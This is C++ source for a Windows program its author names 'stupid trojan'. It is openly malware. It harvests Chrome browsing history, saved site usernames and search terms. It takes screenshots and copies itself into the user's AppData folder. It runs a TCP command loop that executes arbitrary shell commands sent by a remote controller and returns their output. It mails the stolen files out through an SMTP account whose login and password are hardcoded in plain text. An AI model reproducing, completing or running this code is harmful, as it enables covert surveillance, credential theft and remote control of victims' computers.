#include "util.h"
#include <minwinbase.h>

void sendemail(list<string> &l)
{
	bool bError = false;

	try
	{
		CSmtp mail;
		mail.SetSMTPServer("smtp.163.com", 25);
		mail.SetLogin("liutobepure@163.com");
		mail.SetPassword("xiaoliu123");
		mail.SetSenderName("stupid trojan");
		mail.SetSenderMail("liutobepure@163.com");
		mail.SetReplyTo("liutobepure@163.com");
		mail.SetSubject("The message");
		mail.AddRecipient("1025313214@qq.com");
		mail.SetXPriority(XPRIORITY_NORMAL);
		mail.SetXMailer("The Bat!");
		mail.AddMsgLine("Hello,");
		mail.AddMsgLine("");
		mail.AddMsgLine("...");
		mail.AddMsgLine("new chrome data is coming!");
		mail.AddMsgLine("");
		mail.AddMsgLine("Regards");
		mail.ModMsgLine(5, "regards");
		mail.DelMsgLine(2);
		mail.AddMsgLine("stupid trojan");

		if(l.empty())
		{
			char   buffer[MAX_PATH];
			getcwd(buffer, MAX_PATH);
			strcat(buffer, "\\log");
			mail.AddAttachment(buffer);
		}
		else
		{
			for (auto it = l.begin(); it != l.end(); ++it)
			{
				mail.AddAttachment((*it).c_str());
			}
		}
		try
		{
			mail.Send();
		}
		catch(...)
		{
			cout << "err" << endl;
		}

	}
	catch (ECSmtp e)
	{
		bError = true;
	}
}

void getHistory()
{
	BrowsHistory browseHistory;
	browseHistory.Init();
	while (!browseHistory.m_bStatus);	//等待获取完成  
	auto data = browseHistory.GetBrowsHistory();
	setlocale(LC_CTYPE, "");
	wofstream outfile("log");
	outfile.imbue(std::locale("CHS"));
	outfile << "The websites and the number of visited times: " << endl;
	for (auto it = data.begin(); it<data.end(); ++it)
	{
		//wcout << it->strURL.GetString() << "  " << it->nCount << endl;
		outfile << it->strURL.GetString() << "  " << it->nCount << endl;
	}


	outfile <<"The url and the account of these website: "<<endl;
	auto person = browseHistory.GetPersonInfo();
	for (auto it = person.begin(); it != person.end(); ++it)
	{
		outfile<< it->url.GetString() << "	" << it->username.GetString() << endl;
		//wcout<< it->url.GetString() << "	" << it->username.GetString() << endl;
	}

	outfile << "The items which are searched: "<<endl;
	auto search_term = browseHistory.GetSearchInfo();
	for(auto it=search_term.begin();it!=search_term.end();++it)
	{
		outfile << it->term.GetString()<<"	";
		//wcout << it->term.GetString() << "	";
	}
	outfile.close();
}

void copy()
{
	try
	{
		copyitself("\\stupid-trojan.exe");
		copyitself("\\sqlite3.dll");
	}
	catch(...){}
	
}

void copyitself(const char *s)
{
	char system[MAX_PATH];
	char pathtofile[MAX_PATH];
	//得到当前执行文件的全路径
	getcwd(pathtofile,MAX_PATH);
	strcat(pathtofile, s);
	//cout << getenv("homepath") << endl;
	strcpy(system, "C:");
	strcat(system, getenv("homepath"));
	strcat(system, "\\AppData\\Local");
	strcat(system, s);
	//cout << pathtofile << "  " << system << endl;
	if(strcmp(system,pathtofile))
	{
		ifstream source(pathtofile, ios::binary);
		ofstream dest(system, ios::binary);
		istreambuf_iterator<char> begin_source(source);
		istreambuf_iterator<char> end_source;
		ostreambuf_iterator<char> begin_dest(dest);
		copy(begin_source, end_source, begin_dest);

		source.close();
		dest.close();
	}
	//getchar();
}

int ScreenCapture(const char* fname)
{
	int result = 0;
	HWND hWnd = GetDesktopWindow();
	HBITMAP hbmScreen = NULL;
	HDC hdcScreen = GetDC(NULL);
	HDC hdcWindow = GetDC(hWnd);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	HDC hdcMemDC = CreateCompatibleDC(hdcWindow);
	if (!hdcMemDC) goto cleanup;

	hbmScreen = CreateCompatibleBitmap(hdcWindow, w, h);
	if (!hbmScreen) goto cleanup;

	SelectObject(hdcMemDC, hbmScreen);
	if (!BitBlt(hdcMemDC, 0, 0, w, h, hdcWindow, 0, 0, SRCCOPY)) goto cleanup;

	BITMAPFILEHEADER   bmfHeader;
	BITMAPINFOHEADER   bi;

	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = w;
	bi.biHeight = h;
	bi.biPlanes = 1;
	bi.biBitCount = 32;
	bi.biCompression = BI_RGB;
	bi.biSizeImage = 0;
	bi.biXPelsPerMeter = 0;
	bi.biYPelsPerMeter = 0;
	bi.biClrUsed = 0;
	bi.biClrImportant = 0;

	DWORD dwBmpSize = ((w * bi.biBitCount + 31) / 32) * 4 * h;

	HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize);
	char* lpbitmap = (char*)GlobalLock(hDIB);

	GetDIBits(hdcWindow, hbmScreen, 0, h, lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

	bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
	bmfHeader.bfSize = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
	bmfHeader.bfType = 0x4D42; //'BM' for Bitmaps
	try
	{
		DWORD temp = 0;
		HANDLE hFile = CreateFileA(fname, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &temp, NULL);
		WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &temp, NULL);
		WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &temp, NULL);
		CloseHandle(hFile);
	}
	catch(...)
	{
		
	}
	GlobalUnlock(hDIB);
	GlobalFree(hDIB);

	result = 1; //success

cleanup:
	DeleteObject(hbmScreen);
	DeleteObject(hdcMemDC);
	ReleaseDC(NULL, hdcScreen);
	ReleaseDC(hWnd, hdcWindow);
	return result;
}

void tcpconnect(char *addr,char*  port)
{
	int pn(0);
	list<string> l;
	const int buflen = 512;
	WSADATA wsaData;
	SOCKET connect_socket = INVALID_SOCKET;
	struct addrinfo *result = NULL,
		*ptr = NULL,
		hints;
	char recvbuf[buflen];
	
	//Initialize winsock
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if(iResult!=0)
		return;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(addr, port, &hints, &result);
	if (iResult != 0) 
	{
		WSACleanup();
		return;
	}

	// Attempt to connect to an address until one succeeds
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) 
	{
		// Create a SOCKET for connecting to server
		connect_socket = socket(ptr->ai_family, ptr->ai_socktype,
			ptr->ai_protocol);
		if (connect_socket == INVALID_SOCKET) {
			WSACleanup();
			return;
		}
		// Connect to server.
		iResult = connect(connect_socket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(connect_socket);
			connect_socket = INVALID_SOCKET;
			continue;
		}
		break;
	}

	freeaddrinfo(result);
	if (connect_socket == INVALID_SOCKET) {
		WSACleanup();
		return;
	}

	// Send an initial buffer
	send(connect_socket, "successfully connect",buflen, 0);

	// Receive until the peer closes the connection

	
	do {
		recv(connect_socket, recvbuf, buflen, 0);
		string a1("");
		string a2("");
		bool t(false);
		for(int i=0;recvbuf[i]!='\0';++i)
		{
			if(recvbuf[i]==' ' && !t)
			{
				t = true;
				continue;
			}
			if(!t)
			{
				a1 += recvbuf[i];
			}
			else
			{
				a2 += recvbuf[i];
			}
		}

		if(a1=="email")
		{
			sendemail(l);
			l.clear();
			_popen("del *.png", "w");
			send(connect_socket, "end", buflen, 0);
		}
		else if(a1=="screenfetch")
		{
			string s = to_string(pn);
			s += ".png";
			//CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ScreenCapture, s.c_str(), 0, NULL);
			ScreenCapture(s.c_str());
			char   path[MAX_PATH];
			getcwd(path, MAX_PATH);
			strcat(path, "\\");
			strcat(path, s.c_str());
			l.push_back(path);
			++pn;
			send(connect_socket, "end", buflen, 0);
		}
		else if (a1 == "get")
		{
			l.push_back(a2);
			send(connect_socket, "end", buflen, 0);
		}
		else if(a1=="bye")
		{
			break;
		}
		else if(a1=="ls")
		{
			for(auto it=l.begin();it!=l.end();++it)
			{
				send(connect_socket, (*it).c_str(), buflen, 0);
			}
			send(connect_socket, "end", buflen, 0);
		}
		else
		{
			FILE * fp;
			char buffer[buflen];
			fp = _popen(recvbuf, "r");
			while (fgets(buffer, buflen, fp))
			{
				int j= strlen(buffer);
				send(connect_socket, buffer, buflen, 0);
			}
			send(connect_socket, "end", buflen, 0);
			_pclose(fp);
		}
	} while (true);

	// cleanup
	closesocket(connect_socket);
	WSACleanup();
}



bool get_host_file()
{
	
}